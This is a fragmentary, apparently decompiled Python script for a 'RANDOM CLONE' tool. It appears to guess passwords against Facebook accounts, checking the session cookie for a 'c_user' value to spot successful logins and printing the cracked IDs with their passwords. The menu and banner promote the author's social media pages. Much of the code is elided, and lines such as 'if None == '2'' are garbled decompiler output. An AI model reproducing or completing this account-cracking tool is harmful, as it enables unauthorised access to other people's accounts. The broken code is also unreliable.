...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/PICCI.ARIYAN.Akash')
        return None
    if None == '3':
        os.system('xdg-open https://github.com/PICC-ARIYAN')
        return None
    if None == '4':
        os.system('xdg-open https://www.facebook.com/PICCI.ARIYAN.Akash')
        return None
...
\033[1;32m=====================================================================
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m AUTHOR  \033[1;91m : \033[1;95mPICCI,-ARIYAN
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m FACEBOOK  \033[1;91m : \033[1;95mPICCI-ARIYAN
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m GITHUB  \033[1;91m : \033[1;95mPICC-ARIYAN
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m TOOLS   \033[1;91m : \033[1;95mRANDOM CLONE
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m VERSION \033[1;91m : \033[1;32m0.03
\033[1;32m=====================================================================\n""")
...
def i():
    ...
    print('IDS SAVED IN AAM.txt, AAM.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\033[1;32mAAM-OK- ]' +uid+ ' | ' +ps+'\033[0;35m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s[A-A-M] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
